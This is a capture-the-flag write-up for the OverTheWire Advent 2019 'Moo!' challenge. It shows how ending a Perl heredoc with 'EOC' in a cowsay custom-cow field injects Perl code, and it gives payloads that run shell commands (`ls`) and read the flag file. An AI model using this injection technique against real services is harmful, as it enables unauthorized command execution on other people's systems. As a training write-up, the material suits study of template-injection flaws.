# Moo!
### Prompt
> 'Moo may represent an idea, but only the cow knows.' - Mason Cooley 
```
Service: http://3.93.128.89:1204
```

### Solution
Viewing all the different cows, we find that custom_cow looks interesting because it has more inputs like `$eyes`, `$tongue`, and `$thoughts`. All variables are used in the `custom_cow` text area. Try to use a new variable like `$test` and you'll get an error message:

> $ must be escaped with \ except when using $thoughts, $eyes or $tongue

The text area interprets some variables. This tells us that this text area is vulnerable to input.

Doing a bit more research on cowsay brings us to the cowsay package site. From here you can download the source and inspect the different cow files. Notice that all cow files are multiline comments that use `EOC` as the start and end symbol. For example, the ghostbusters cow looks like this:

```
##
## Ghostbusters!
##
$the_cow = <<EOC;
          $thoughts
           $thoughts
            $thoughts          __---__
                    _-       /--______
               __--( /     \\ )XXXXXXXXXXX\\v.
             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
            /XXX(       U     )        XXXXXXX\\
          /XXXXX(              )--_  XXXXXXXXXXX\\
         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\
         XXXXX/   /            XXXXXX   \\__ \\XXXXX
         XXXXXX__/          XXXXXX         \\__---->
 ---___  XXX__/          XXXXXX      \\__         /
   \\-  --__/   ___/\\  XXXXXX            /  ___--/=
    \\-\\    ___/    XXXXXX              '--- XXXXXX
       \\-\\/XXX\\ XXXXXX                      /XXXXX
         \\XXXXXXXXX   \\                    /XXXXX/
          \\XXXXXX      >                 _/XXXXX/
            \\XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \\XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
EOC
```

If we enter `EOC` in the custom_cow text area, notice that it does not appear in the result. The command likely ran. Now try to print something.

```
EOC
print "HELLO_WORLD\n";
```

You will get:

```
HELLO_WORLD
 ___________
< $thoughts >
 -----------
```

Now we know we can execute whatever we want. Try printing the directory.

```
EOC
print `ls`;
```

The result:

```
flag
server.py
templates
 _________
< message >
 ---------
```

Now print the flag file:

```
EOC
print `ls`;
open (FH, 'flag');
print <FH>;
```

And get the flag: 
```
flag
server.py
templates
AOTW{the_perl_cow_says_moo} 
_________
< message >
 ---------
```

#### Links
https://advent2019.overthewire.org/

https://packages.ubuntu.com/source/bionic/cowsay
